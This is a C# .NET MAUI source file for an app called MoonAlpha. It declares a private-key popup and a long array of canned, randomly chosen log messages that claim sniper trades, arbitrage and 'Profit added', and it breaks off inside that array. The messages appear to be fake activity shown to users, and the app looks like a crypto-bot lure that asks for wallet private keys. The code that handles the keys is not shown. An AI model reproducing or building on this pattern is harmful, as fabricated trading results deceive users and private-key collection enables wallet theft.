
using CommunityToolkit.Maui.Views;
using Microsoft.Maui.Controls;
using System.Collections.ObjectModel;
namespace MoonAlphaMauiApps
{
    public partial class MainPage : ContentPage
    {
        int count = 0;
        PrivateKeyPopup privateKeyPopup;
        
        private readonly string[] randomTexts = new[]
{
    "[WARNING] High slippage detected. Recalculating optimal buy price...",
    "[SUCCESS] Trade completed. Profit added.",
    "[SUCCESS] Buy order placed under optimal conditions.",
    "[INFO] Auto-compounding profits into next sniper trade...",
    "[INFO] Arbitrage opportunity detected. Calculating profit margin...",
    "[SUCCESS] Sniped successfully. Position secured.",
    "[INFO] Monitoring blockchain mempool for pending transactions...",
    "[INFO] Adjusting risk management settings...",
    "[ALERT] Potential rug pull detected! Skipping trade...",
    "[INFO] MoonAlpha AI adjusting trading strategy based on market trends...",
    "[INFO] Market volatility detected. Adjusting sniper settings...",
    "[SUCCESS] High-speed execution completed. Profit added.",
    "[INFO] Monitoring price action...",
    "[INFO] Gas optimization in progress. Reducing transaction costs...",
    "[INFO] Telegram alert sent: New profitable trade executed.",
    "[ERROR] Transaction failed. Retrying with new gas settings...",
    "[INFO] Price pump detected. Evaluating exit strategy...",
    "[INFO] Stop-loss triggered. Preventing further losses...",
    "[INFO] Rug pull detection module active. Scanning for suspicious activity...",
    "[INFO] Low liquidity warning. Evaluating risk factors...",
    "[INFO] Front-running protection enabled.",
    "[SUCCESS] Buy order executed at optimal entry point.",
    "[INFO] Liquidity detected. Analyzing token contract...",
    "[WARNING] Market cooldown detected. Reducing trade frequency...",
    "[INFO] AI algorithm detecting next trading opportunity...",
    "[SUCCESS] Sell order executed. Profit added.",
    "[INFO] Large volume detected. Preparing sniper execution...",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[INFO] Smart stop-loss activated. Monitoring for price reversal...",
            "[INFO] AI algorithm detecting next trading opportunity...",
    "[INFO] Auto-compounding profits into next sniper trade...",
    "[INFO] Front-running protection enabled.",
    "[SUCCESS] Trade completed. Profit added.",
    "[INFO] Arbitrage opportunity detected. Calculating profit margin...",
    "[ALERT] Potential rug pull detected! Skipping trade...",
    "[INFO] Contract verified. Deploying buy order...",
    "[INFO] Price pump detected. Evaluating exit strategy...",
    "[SUCCESS] High-speed execution completed. Profit added.",
    "[SUCCESS] Sell order executed. Profit added.",
    "[INFO] MoonAlpha AI adjusting trading strategy based on market trends...",
    "[ALERT] Potential rug pull detected! Skipping trade...",
    "[INFO] Large volume detected. Preparing sniper execution...",
    "[SUCCESS] Sniped successfully. Position secured.",
    "[SUCCESS] High-speed execution completed. Profit added.",
    "[SUCCESS] Buy order placed under optimal conditions.",
    "[SUCCESS] Sell order executed. Profit added.",
    "[INFO] Sell signal detected. Executing exit strategy...",
    "[ERROR] Transaction failed. Retrying with new gas settings...",
    "[INFO] Market volatility detected. Adjusting sniper settings...",
    "[INFO] Stop-loss triggered. Preventing further losses...",
    "[SUCCESS] Buy order executed at optimal entry point.",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[SUCCESS] Successful re-entry at lower price. Profit added.",
    "[INFO] Sniper mode activated... Scanning for new liquidity pools.",
    "[SUCCESS] Arbitrage trade executed. Profit added.",
    "[INFO] Rug pull detection module active. Scanning for suspicious activity...",
    "[INFO] Gas optimization in progress. Reducing transaction costs...",
    "[SUCCESS] Buy order executed successfully.",
    "[INFO] Low liquidity warning. Evaluating risk factors...",
    "[INFO] Smart stop-loss activated. Monitoring for price reversal...",
    "[INFO] Monitoring blockchain mempool for pending transactions...",
    "[WARNING] Market cooldown detected. Reducing trade frequency...",
    "[SUCCESS] Sniped successfully. Position secured.",
    "[INFO] Telegram alert sent: New profitable trade executed.",
    "[INFO] Monitoring price action...",
    "[WARNING] High slippage detected. Recalculating optimal buy price...",
    "[INFO] Adjusting risk management settings...",
    "[INFO] Liquidity detected. Analyzing token contract...",
    "[INFO] Contract verified. Deploying buy order...",
            "[INFO] Front-running protection enabled.",
    "[INFO] Sell signal detected. Executing exit strategy...",
    "[INFO] Auto-compounding profits into next sniper trade...",
    "[INFO] Stop-loss triggered. Preventing further losses...",
    "[INFO] Large volume detected. Preparing sniper execution...",
    "[ALERT] Potential rug pull detected! Skipping trade...",
    "[WARNING] Market cooldown detected. Reducing trade frequency...",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[WARNING] High slippage detected. Recalculating optimal buy price...",
    "[SUCCESS] Successful re-entry at lower price. Profit added.",
    "[INFO] Arbitrage opportunity detected. Calculating profit margin...",
    "[SUCCESS] Sniped successfully. Position secured.",
    "[INFO] Sniper mode activated... Scanning for new liquidity pools.",
    "[INFO] Adjusting risk management settings...",
    "[SUCCESS] Sell order executed. Profit added.",
    "[INFO] Market volatility detected. Adjusting sniper settings...",
    "[SUCCESS] Trade completed. Profit added.",
    "[INFO] Monitoring blockchain mempool for pending transactions...",
    "[INFO] Contract verified. Deploying buy order...",
    "[INFO] Liquidity detected. Analyzing token contract...",
    "[INFO] Smart stop-loss activated. Monitoring for price reversal...",
    "[INFO] Rug pull detection module active. Scanning for suspicious activity...",
    "[INFO] Low liquidity warning. Evaluating risk factors...",
    "[INFO] Price pump detected. Evaluating exit strategy...",
    "[SUCCESS] Arbitrage trade executed. Profit added.",
    "[INFO] Gas optimization in progress. Reducing transaction costs...",
    "[ERROR] Transaction failed. Retrying with new gas settings...",
    "[INFO] AI algorithm detecting next trading opportunity...",
    "[INFO] Auto-compounding profits into next sniper trade...",
    "[SUCCESS] Successful re-entry at lower price. Profit added.",
    "[SUCCESS] High-speed execution completed. Profit added.",
    "[INFO] Monitoring blockchain mempool for pending transactions...",
    "[INFO] Adjusting risk management settings...",
    "[SUCCESS] Sniped successfully. Position secured.",
    "[SUCCESS] Sniped successfully. Position secured.",
    "[SUCCESS] Buy order executed at optimal entry point.",
    "[INFO] Price pump detected. Evaluating exit strategy...",
    "[ALERT] Potential rug pull detected! Skipping trade...",
    "[SUCCESS] Arbitrage trade executed. Profit added.",
    "[INFO] Arbitrage opportunity detected. Calculating profit margin...",
    "[INFO] Market volatility detected. Adjusting sniper settings...",
    "[INFO] Smart stop-loss activated. Monitoring for price reversal...",
    "[INFO] Gas optimization in progress. Reducing transaction costs...",
    "[SUCCESS] Sell order executed. Profit added.",
    "[INFO] Gas optimization in progress. Reducing transaction costs...",
    "[SUCCESS] Buy order executed at optimal entry point.",
    "[SUCCESS] Buy order executed at optimal entry point.",
    "[INFO] Market volatility detected. Adjusting sniper settings...",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[INFO] AI algorithm detecting next trading opportunity...",
    "[SUCCESS] Buy order executed at optimal entry point.",
    "[SUCCESS] Trade completed. Profit added.",
    "[INFO] MoonAlpha AI adjusting trading strategy based on market trends...",
    "[INFO] Adjusting risk management settings...",
    "[SUCCESS] Arbitrage trade executed. Profit added.",
    "[INFO] Price pump detected. Evaluating exit strategy...",
    "[INFO] Telegram alert sent: New profitable trade executed.",
    "[INFO] Monitoring blockchain mempool for pending transactions...",
    "[INFO] Telegram alert sent: New profitable trade executed.",
    "[INFO] Front-running protection enabled.",
    "[INFO] Market volatility detected. Adjusting sniper settings...",
    "[SUCCESS] Sell order executed. Profit added.",
    "[INFO] Sell signal detected. Executing exit strategy...",
    "[INFO] Contract verified. Deploying buy order...",
    "[INFO] AI algorithm detecting next trading opportunity...",
    "[INFO] Market volatility detected. Adjusting sniper settings...",
    "[INFO] Sniper mode activated... Scanning for new liquidity pools.",
    "[INFO] Front-running protection enabled.",
    "[SUCCESS] Buy order placed under optimal conditions.",
    "[INFO] AI algorithm detecting next trading opportunity...",
    "[INFO] Arbitrage opportunity detected. Calculating profit margin...",
    "[INFO] Front-running protection enabled.",
    "[WARNING] High slippage detected. Recalculating optimal buy price...",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[INFO] Gas optimization in progress. Reducing transaction costs...",
    "[INFO] Price pump detected. Evaluating exit strategy...",
    "[INFO] Rug pull detection module active. Scanning for suspicious activity...",
    "[INFO] Large volume detected. Preparing sniper execution...",
    "[INFO] Contract verified. Deploying buy order...",
    "[SUCCESS] Buy order executed successfully.",
    "[ERROR] Transaction failed. Retrying with new gas settings...",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[INFO] Low liquidity warning. Evaluating risk factors...",
    "[INFO] Liquidity detected. Analyzing token contract...",
    "[INFO] Monitoring blockchain mempool for pending transactions...",
    "[SUCCESS] Sniped successfully. Position secured.",
    "[SUCCESS] Buy order executed successfully.",
    "[SUCCESS] Sniped successfully. Position secured.",
    "[SUCCESS] Buy order executed successfully.",
    "[SUCCESS] Arbitrage trade executed. Profit added.",
    "[INFO] Monitoring price action...",
    "[SUCCESS] High-speed execution completed. Profit added.",
    "[INFO] AI algorithm detecting next trading opportunity...",
    "[INFO] Contract verified. Deploying buy order...",
    "[INFO] Sniper mode activated... Scanning for new liquidity pools.",
    "[SUCCESS] High-speed execution completed. Profit added.",
    "[SUCCESS] Buy order placed under optimal conditions.",
    "[SUCCESS] Arbitrage trade executed. Profit added.",
    "[INFO] AI algorithm detecting next trading opportunity...",
    "[INFO] Telegram alert sent: New profitable trade executed.",
    "[INFO] Sniper mode activated... Scanning for new liquidity pools.",
    "[INFO] Market volatility detected. Adjusting sniper settings...",
    "[INFO] Low liquidity warning. Evaluating risk factors...",
    "[INFO] Monitoring price action...",
    "[INFO] Sell signal detected. Executing exit strategy...",
    "[SUCCESS] Buy order placed under optimal conditions.",
    "[SUCCESS] Arbitrage trade executed. Profit added.",
    "[WARNING] High slippage detected. Recalculating optimal buy price...",
    "[SUCCESS] Sniped successfully. Position secured.",
    "[INFO] Front-running protection enabled.",
    "[INFO] AI algorithm detecting next trading opportunity...",
    "[SUCCESS] Trade completed. Profit added.",
    "[SUCCESS] Arbitrage trade executed. Profit added.",
    "[WARNING] Market cooldown detected. Reducing trade frequency...",
    "[INFO] Contract verified. Deploying buy order...",
    "[INFO] Sell signal detected. Executing exit strategy...",
    "[INFO] AI algorithm detecting next trading opportunity...",
    "[SUCCESS] Sniped successfully. Position secured.",
    "[INFO] Gas optimization in progress. Reducing transaction costs...",
    "[SUCCESS] Buy order placed under optimal conditions.",
    "[INFO] Auto-compounding profits into next sniper trade...",
    "[SUCCESS] Trade completed. Profit added.",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[INFO] Front-running protection enabled.",
    "[INFO] Monitoring blockchain mempool for pending transactions...",
    "[INFO] Smart stop-loss activated. Monitoring for price reversal...",
    "[INFO] Adjusting risk management settings...",
    "[INFO] Large volume detected. Preparing sniper execution...",
    "[INFO] Telegram alert sent: New profitable trade executed.",
    "[INFO] Monitoring blockchain mempool for pending transactions...",
    "[INFO] MoonAlpha AI adjusting trading strategy based on market trends...",
    "[SUCCESS] Buy order executed at optimal entry point.",
    "[SUCCESS] Sniped successfully. Position secured.",
    "[ALERT] Potential rug pull detected! Skipping trade...",
    "[INFO] Sniper mode activated... Scanning for new liquidity pools.",
    "[INFO] Arbitrage opportunity detected. Calculating profit margin...",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[ERROR] Transaction failed. Retrying with new gas settings...",
    "[INFO] Liquidity detected. Analyzing token contract...",
    "[INFO] Sell signal detected. Executing exit strategy...",
    "[INFO] Large volume detected. Preparing sniper execution...",
    "[INFO] Sniper mode activated... Scanning for new liquidity pools.",
    "[ERROR] Transaction failed. Retrying with new gas settings...",
    "[SUCCESS] Trade completed. Profit added.",
    "[SUCCESS] Arbitrage trade executed. Profit added.",
    "[INFO] Telegram alert sent: New profitable trade executed.",
    "[WARNING] High slippage detected. Recalculating optimal buy price...",
    "[INFO] Monitoring blockchain mempool for pending transactions...",
    "[SUCCESS] Buy order executed successfully.",
    "[ALERT] Potential rug pull detected! Skipping trade...",
    "[SUCCESS] Arbitrage trade executed. Profit added.",
    "[SUCCESS] Successful re-entry at lower price. Profit added.",
    "[INFO] Sell signal detected. Executing exit strategy...",
    "[SUCCESS] Buy order executed at optimal entry point.",
    "[INFO] Monitoring blockchain mempool for pending transactions...",
    "[INFO] Sell signal detected. Executing exit strategy...",
    "[SUCCESS] Buy order executed at optimal entry point.",
    "[INFO] Arbitrage opportunity detected. Calculating profit margin...",
    "[WARNING] High slippage detected. Recalculating optimal buy price...",
    "[INFO] Liquidity detected. Analyzing token contract...",
    "[INFO] MoonAlpha AI adjusting trading strategy based on market trends...",
    "[INFO] Monitoring blockchain mempool for pending transactions...",
    "[INFO] Liquidity detected. Analyzing token contract...",
    "[INFO] MoonAlpha AI adjusting trading strategy based on market trends...",
    "[INFO] Rug pull detection module active. Scanning for suspicious activity...",
    "[ERROR] Transaction failed. Retrying with new gas settings...",
    "[INFO] Smart stop-loss activated. Monitoring for price reversal...",
    "[INFO] Contract verified. Deploying buy order...",
    "[INFO] Low liquidity warning. Evaluating risk factors...",
    "[SUCCESS] Buy order placed under optimal conditions.",
    "[INFO] Auto-compounding profits into next sniper trade...",
    "[INFO] Stop-loss triggered. Preventing further losses...",
    "[INFO] Sniper mode activated... Scanning for new liquidity pools.",
    "[INFO] Market volatility detected. Adjusting sniper settings...",
    "[INFO] Auto-compounding profits into next sniper trade...",
    "[INFO] Stop-loss triggered. Preventing further losses...",
    "[INFO] Adjusting risk management settings...",
    "[SUCCESS] Buy order placed under optimal conditions.",
    "[WARNING] Market cooldown detected. Reducing trade frequency...",
    "[INFO] Auto-compounding profits into next sniper trade...",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[INFO] Liquidity detected. Analyzing token contract...",
    "[INFO] AI algorithm detecting next trading opportunity...",
    "[INFO] Monitoring blockchain mempool for pending transactions...",
    "[INFO] Arbitrage opportunity detected. Calculating profit margin...",
    "[INFO] Front-running protection enabled.",
    "[INFO] Stop-loss triggered. Preventing further losses...",
    "[INFO] Sniper mode activated... Scanning for new liquidity pools.",
    "[INFO] Price pump detected. Evaluating exit strategy...",
    "[INFO] Adjusting risk management settings...",
    "[SUCCESS] Successful re-entry at lower price. Profit added.",
    "[SUCCESS] Successful re-entry at lower price. Profit added.",
    "[INFO] MoonAlpha AI adjusting trading strategy based on market trends...",
    "[SUCCESS] Arbitrage trade executed. Profit added.",
    "[INFO] Rug pull detection module active. Scanning for suspicious activity...",
    "[SUCCESS] Buy order executed at optimal entry point.",
    "[INFO] Telegram alert sent: New profitable trade executed.",
    "[INFO] Stop-loss triggered. Preventing further losses...",
    "[INFO] Market volatility detected. Adjusting sniper settings...",
    "[INFO] Smart stop-loss activated. Monitoring for price reversal...",
    "[INFO] Large volume detected. Preparing sniper execution...",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[INFO] Contract verified. Deploying buy order...",
    "[SUCCESS] High-speed execution completed. Profit added.",
    "[INFO] Auto-compounding profits into next sniper trade...",
    "[INFO] AI algorithm detecting next trading opportunity...",
    "[INFO] MoonAlpha AI adjusting trading strategy based on market trends...",
    "[SUCCESS] High-speed execution completed. Profit added.",
    "[INFO] Front-running protection enabled.",
    "[INFO] Monitoring price action...",
    "[INFO] Sniper mode activated... Scanning for new liquidity pools.",
    "[WARNING] High slippage detected. Recalculating optimal buy price...",
    "[INFO] MoonAlpha AI adjusting trading strategy based on market trends...",
    "[INFO] Low liquidity warning. Evaluating risk factors...",
    "[SUCCESS] Buy order placed under optimal conditions.",
    "[INFO] Sell signal detected. Executing exit strategy...",
    "[INFO] Gas optimization in progress. Reducing transaction costs...",
    "[INFO] MoonAlpha AI adjusting trading strategy based on market trends...",
    "[INFO] Monitoring blockchain mempool for pending transactions...",
    "[INFO] Monitoring blockchain mempool for pending transactions...",
    "[ERROR] Transaction failed. Retrying with new gas settings...",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[INFO] Monitoring blockchain mempool for pending transactions...",
    "[INFO] Rug pull detection module active. Scanning for suspicious activity...",
    "[SUCCESS] Trade completed. Profit added.",
    "[WARNING] High slippage detected. Recalculating optimal buy price...",
    "[INFO] Adjusting risk management settings...",
    "[INFO] Contract verified. Deploying buy order...",
    "[INFO] Auto-compounding profits into next sniper trade...",
    "[SUCCESS] Arbitrage trade executed. Profit added.",
    "[SUCCESS] Successful re-entry at lower price. Profit added.",
    "[INFO] Monitoring blockchain mempool for pending transactions...",
    "[SUCCESS] Buy order executed successfully.",
    "[INFO] Monitoring price action...",
    "[INFO] Stop-loss triggered. Preventing further losses...",
    "[INFO] Adjusting risk management settings...",
    "[SUCCESS] Arbitrage trade executed. Profit added.",
    "[WARNING] Market cooldown detected. Reducing trade frequency...",
    "[INFO] Auto-compounding profits into next sniper trade...",
    "[INFO] Sell signal detected. Executing exit strategy...",
    "[INFO] Sniper mode activated... Scanning for new liquidity pools.",
    "[SUCCESS] High-speed execution completed. Profit added.",
    "[INFO] Front-running protection enabled.",
    "[INFO] Front-running protection enabled.",
    "[INFO] Liquidity detected. Analyzing token contract...",
    "[INFO] Liquidity detected. Analyzing token contract...",
    "[INFO] Gas optimization in progress. Reducing transaction costs...",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[SUCCESS] Arbitrage trade executed. Profit added.",
    "[INFO] Stop-loss triggered. Preventing further losses...",
    "[SUCCESS] Buy order placed under optimal conditions.",
    "[WARNING] High slippage detected. Recalculating optimal buy price...",
    "[INFO] Smart stop-loss activated. Monitoring for price reversal...",
    "[INFO] Adjusting risk management settings...",
    "[INFO] Smart stop-loss activated. Monitoring for price reversal...",
    "[INFO] Sniper mode activated... Scanning for new liquidity pools.",
    "[INFO] Gas optimization in progress. Reducing transaction costs...",
    "[ERROR] Transaction failed. Retrying with new gas settings...",
    "[INFO] Stop-loss triggered. Preventing further losses...",
    "[SUCCESS] Buy order placed under optimal conditions.",
    "[INFO] Telegram alert sent: New profitable trade executed.",
    "[INFO] Large volume detected. Preparing sniper execution...",
    "[INFO] Gas optimization in progress. Reducing transaction costs...",
    "[SUCCESS] Sniped successfully. Position secured.",
    "[INFO] Monitoring price action...",
    "[INFO] Adjusting risk management settings...",
    "[INFO] Liquidity detected. Analyzing token contract...",
    "[ERROR] Transaction failed. Retrying with new gas settings...",
    "[INFO] Front-running protection enabled.",
    "[INFO] Rug pull detection module active. Scanning for suspicious activity...",
    "[SUCCESS] Buy order executed at optimal entry point.",
    "[SUCCESS] Successful re-entry at lower price. Profit added.",
    "[SUCCESS] Successful re-entry at lower price. Profit added.",
    "[ALERT] Potential rug pull detected! Skipping trade...",
    "[INFO] Arbitrage opportunity detected. Calculating profit margin...",
    "[WARNING] Market cooldown detected. Reducing trade frequency...",
    "[INFO] Adjusting risk management settings...",
    "[INFO] Contract verified. Deploying buy order...",
    "[INFO] Liquidity detected. Analyzing token contract...",
    "[INFO] Arbitrage opportunity detected. Calculating profit margin...",
    "[SUCCESS] Buy order executed at optimal entry point.",
    "[INFO] Market volatility detected. Adjusting sniper settings...",
    "[INFO] Smart stop-loss activated. Monitoring for price reversal...",
    "[INFO] Sell signal detected. Executing exit strategy...",
    "[INFO] Adjusting risk management settings...",
    "[INFO] Sniper mode activated... Scanning for new liquidity pools.",
    "[INFO] Adjusting risk management settings...",
    "[SUCCESS] Sell order executed. Profit added.",
    "[SUCCESS] Arbitrage trade executed. Profit added.",
    "[INFO] Sniper mode activated... Scanning for new liquidity pools.",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[INFO] Auto-compounding profits into next sniper trade...",
    "[SUCCESS] Arbitrage trade executed. Profit added.",
    "[SUCCESS] Buy order executed at optimal entry point.",
    "[SUCCESS] Sell order executed. Profit added.",
    "[SUCCESS] Trade completed. Profit added.",
    "[SUCCESS] Sell order executed. Profit added.",
    "[SUCCESS] Buy order placed under optimal conditions.",
    "[SUCCESS] Sniped successfully. Position secured.",
    "[INFO] Monitoring blockchain mempool for pending transactions...",
    "[INFO] Sell signal detected. Executing exit strategy...",
    "[ERROR] Transaction failed. Retrying with new gas settings...",
    "[INFO] Stop-loss triggered. Preventing further losses...",
    "[WARNING] High slippage detected. Recalculating optimal buy price...",
    "[INFO] Price pump detected. Evaluating exit strategy...",
    "[INFO] Market volatility detected. Adjusting sniper settings...",
    "[ERROR] Transaction failed. Retrying with new gas settings...",
    "[INFO] MoonAlpha AI adjusting trading strategy based on market trends...",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[INFO] Rug pull detection module active. Scanning for suspicious activity...",
    "[ERROR] Transaction failed. Retrying with new gas settings...",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[WARNING] High slippage detected. Recalculating optimal buy price...",
    "[ERROR] Transaction failed. Retrying with new gas settings...",
    "[ERROR] Transaction failed. Retrying with new gas settings...",
    "[SUCCESS] Successful re-entry at lower price. Profit added.",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[INFO] Smart stop-loss activated. Monitoring for price reversal...",
    "[INFO] Liquidity detected. Analyzing token contract...",
    "[INFO] Auto-compounding profits into next sniper trade...",
    "[INFO] Market volatility detected. Adjusting sniper settings...",
    "[INFO] Low liquidity warning. Evaluating risk factors...",
    "[SUCCESS] Buy order executed at optimal entry point.",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[SUCCESS] Buy order executed at optimal entry point.",
    "[SUCCESS] Sell order executed. Profit added.",
    "[INFO] Liquidity detected. Analyzing token contract...",
    "[INFO] Front-running protection enabled.",
    "[INFO] Arbitrage opportunity detected. Calculating profit margin...",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[INFO] Front-running protection enabled.",
    "[SUCCESS] Buy order placed under optimal conditions.",
    "[SUCCESS] Buy order executed at optimal entry point.",
    "[INFO] Auto-compounding profits into next sniper trade...",
    "[INFO] Gas optimization in progress. Reducing transaction costs...",
    "[SUCCESS] Arbitrage trade executed. Profit added.",
    "[INFO] Market volatility detected. Adjusting sniper settings...",
    "[WARNING] High slippage detected. Recalculating optimal buy price...",
    "[INFO] Large volume detected. Preparing sniper execution...",
    "[INFO] Contract verified. Deploying buy order...",
    "[ALERT] Potential rug pull detected! Skipping trade...",
    "[SUCCESS] Sniped successfully. Position secured.",
    "[INFO] Rug pull detection module active. Scanning for suspicious activity...",
    "[SUCCESS] Buy order executed at optimal entry point.",
    "[SUCCESS] High-speed execution completed. Profit added.",
    "[INFO] Adjusting risk management settings...",
    "[INFO] Smart stop-loss activated. Monitoring for price reversal...",
    "[INFO] Rug pull detection module active. Scanning for suspicious activity...",
    "[INFO] Price pump detected. Evaluating exit strategy...",
    "[SUCCESS] Buy order executed at optimal entry point.",
    "[INFO] Front-running protection enabled.",
    "[INFO] Rug pull detection module active. Scanning for suspicious activity...",
    "[SUCCESS] Arbitrage trade executed. Profit added.",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[INFO] Adjusting risk management settings...",
    "[INFO] Liquidity detected. Analyzing token contract...",
    "[INFO] MoonAlpha AI adjusting trading strategy based on market trends...",
    "[INFO] Stop-loss triggered. Preventing further losses...",
    "[ERROR] Transaction failed. Retrying with new gas settings...",
    "[SUCCESS] Sell order executed. Profit added.",
    "[ALERT] Potential rug pull detected! Skipping trade...",
    "[INFO] Telegram alert sent: New profitable trade executed.",
    "[INFO] Smart stop-loss activated. Monitoring for price reversal...",
    "[INFO] Large volume detected. Preparing sniper execution...",
    "[INFO] Low liquidity warning. Evaluating risk factors...",
    "[WARNING] High slippage detected. Recalculating optimal buy price...",
    "[INFO] Sell signal detected. Executing exit strategy...",
    "[INFO] Liquidity detected. Analyzing token contract...",
    "[SUCCESS] High-speed execution completed. Profit added.",
    "[INFO] Price pump detected. Evaluating exit strategy...",
    "[INFO] Low liquidity warning. Evaluating risk factors...",
    "[INFO] Liquidity detected. Analyzing token contract...",
    "[ALERT] Potential rug pull detected! Skipping trade...",
    "[INFO] Sniper mode activated... Scanning for new liquidity pools.",
    "[ALERT] Potential rug pull detected! Skipping trade...",
    "[WARNING] High slippage detected. Recalculating optimal buy price...",
    "[INFO] Price pump detected. Evaluating exit strategy...",
    "[INFO] Smart stop-loss activated. Monitoring for price reversal...",
    "[INFO] Telegram alert sent: New profitable trade executed.",
    "[INFO] Arbitrage opportunity detected. Calculating profit margin...",
    "[INFO] Sniper mode activated... Scanning for new liquidity pools.",
    "[INFO] AI algorithm detecting next trading opportunity...",
    "[INFO] Low liquidity warning. Evaluating risk factors...",
    "[INFO] AI algorithm detecting next trading opportunity...",
    "[SUCCESS] Successful re-entry at lower price. Profit added.",
    "[SUCCESS] Trade completed. Profit added.",
    "[INFO] Market volatility detected. Adjusting sniper settings...",
    "[INFO] Monitoring blockchain mempool for pending transactions...",
    "[INFO] Rug pull detection module active. Scanning for suspicious activity...",
    "[INFO] Auto-compounding profits into next sniper trade...",
    "[SUCCESS] Sniped successfully. Position secured.",
    "[INFO] Arbitrage opportunity detected. Calculating profit margin...",
    "[ERROR] Transaction failed. Retrying with new gas settings...",
    "[INFO] Liquidity detected. Analyzing token contract...",
    "[INFO] Monitoring price action...",
    "[INFO] Sniper mode activated... Scanning for new liquidity pools.",
    "[SUCCESS] Buy order executed successfully.",
    "[INFO] Rug pull detection module active. Scanning for suspicious activity...",
    "[INFO] Monitoring price action...",
    "[INFO] Price pump detected. Evaluating exit strategy...",
    "[SUCCESS] Trade completed. Profit added.",
    "[INFO] Market volatility detected. Adjusting sniper settings...",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[INFO] Price pump detected. Evaluating exit strategy...",
    "[WARNING] Market cooldown detected. Reducing trade frequency...",
    "[WARNING] Market cooldown detected. Reducing trade frequency...",
    "[INFO] Arbitrage opportunity detected. Calculating profit margin...",
    "[INFO] Front-running protection enabled.",
    "[SUCCESS] Successful re-entry at lower price. Profit added.",
    "[INFO] Low liquidity warning. Evaluating risk factors...",
    "[INFO] Low liquidity warning. Evaluating risk factors...",
    "[SUCCESS] Buy order placed under optimal conditions.",
    "[INFO] Sell signal detected. Executing exit strategy...",
    "[SUCCESS] Sell order executed. Profit added.",
    "[ERROR] Transaction failed. Retrying with new gas settings...",
    "[SUCCESS] Arbitrage trade executed. Profit added.",
    "[SUCCESS] High-speed execution completed. Profit added.",
    "[INFO] Price pump detected. Evaluating exit strategy...",
    "[INFO] Rug pull detection module active. Scanning for suspicious activity...",
    "[SUCCESS] Buy order executed at optimal entry point.",
    "[INFO] Auto-compounding profits into next sniper trade...",
    "[SUCCESS] Sniped successfully. Position secured.",
    "[SUCCESS] Trade completed. Profit added.",
    "[INFO] Price pump detected. Evaluating exit strategy...",
    "[INFO] Large volume detected. Preparing sniper execution...",
    "[INFO] Contract verified. Deploying buy order...",
    "[INFO] Adjusting risk management settings...",
    "[INFO] Large volume detected. Preparing sniper execution...",
    "[INFO] Gas optimization in progress. Reducing transaction costs...",
    "[ERROR] Transaction failed. Retrying with new gas settings...",
    "[INFO] Sniper mode activated... Scanning for new liquidity pools.",
    "[INFO] Large volume detected. Preparing sniper execution...",
    "[INFO] Price pump detected. Evaluating exit strategy...",
    "[INFO] AI algorithm detecting next trading opportunity...",
    "[INFO] Stop-loss triggered. Preventing further losses...",
    "[INFO] Sell signal detected. Executing exit strategy...",
    "[INFO] Sniper mode activated... Scanning for new liquidity pools.",
    "[ALERT] Potential rug pull detected! Skipping trade...",
    "[INFO] Auto-compounding profits into next sniper trade...",
    "[INFO] Rug pull detection module active. Scanning for suspicious activity...",
    "[SUCCESS] Buy order executed at optimal entry point.",
    "[INFO] Front-running protection enabled.",
    "[SUCCESS] Trade completed. Profit added.",
    "[SUCCESS] Buy order placed under optimal conditions.",
    "[INFO] Rug pull detection module active. Scanning for suspicious activity...",
    "[INFO] AI algorithm detecting next trading opportunity...",
    "[INFO] Gas optimization in progress. Reducing transaction costs...",
    "[SUCCESS] Successful re-entry at lower price. Profit added.",
    "[INFO] Smart stop-loss activated. Monitoring for price reversal...",
    "[ALERT] Potential rug pull detected! Skipping trade...",
    "[INFO] Adjusting risk management settings...",
    "[INFO] Price pump detected. Evaluating exit strategy...",
    "[INFO] Adjusting risk management settings...",
    "[INFO] Low liquidity warning. Evaluating risk factors...",
    "[INFO] Auto-compounding profits into next sniper trade...",
    "[INFO] Smart stop-loss activated. Monitoring for price reversal...",
    "[INFO] MoonAlpha AI adjusting trading strategy based on market trends...",
    "[INFO] Price pump detected. Evaluating exit strategy...",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[INFO] Sell signal detected. Executing exit strategy...",
    "[INFO] Arbitrage opportunity detected. Calculating profit margin...",
    "[INFO] Liquidity detected. Analyzing token contract...",
    "[INFO] AI algorithm detecting next trading opportunity...",
    "[INFO] Large volume detected. Preparing sniper execution...",
    "[INFO] MoonAlpha AI adjusting trading strategy based on market trends...",
    "[INFO] Rug pull detection module active. Scanning for suspicious activity...",
    "[INFO] Price pump detected. Evaluating exit strategy...",
    "[INFO] Adjusting risk management settings...",
    "[INFO] Sniper mode activated... Scanning for new liquidity pools.",
    "[SUCCESS] Buy order executed successfully.",
    "[INFO] AI algorithm detecting next trading opportunity...",
    "[INFO] Liquidity detected. Analyzing token contract...",
    "[SUCCESS] Buy order executed at optimal entry point.",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[INFO] Adjusting risk management settings...",
    "[INFO] Liquidity detected. Analyzing token contract...",
    "[INFO] Low liquidity warning. Evaluating risk factors...",
    "[WARNING] High slippage detected. Recalculating optimal buy price...",
    "[INFO] Arbitrage opportunity detected. Calculating profit margin...",
    "[INFO] Smart stop-loss activated. Monitoring for price reversal...",
    "[INFO] Sniper mode activated... Scanning for new liquidity pools.",
    "[INFO] Stop-loss triggered. Preventing further losses...",
    "[SUCCESS] Arbitrage trade executed. Profit added.",
    "[SUCCESS] Successful re-entry at lower price. Profit added.",
    "[INFO] Auto-compounding profits into next sniper trade...",
    "[WARNING] High slippage detected. Recalculating optimal buy price...",
    "[INFO] Monitoring price action...",
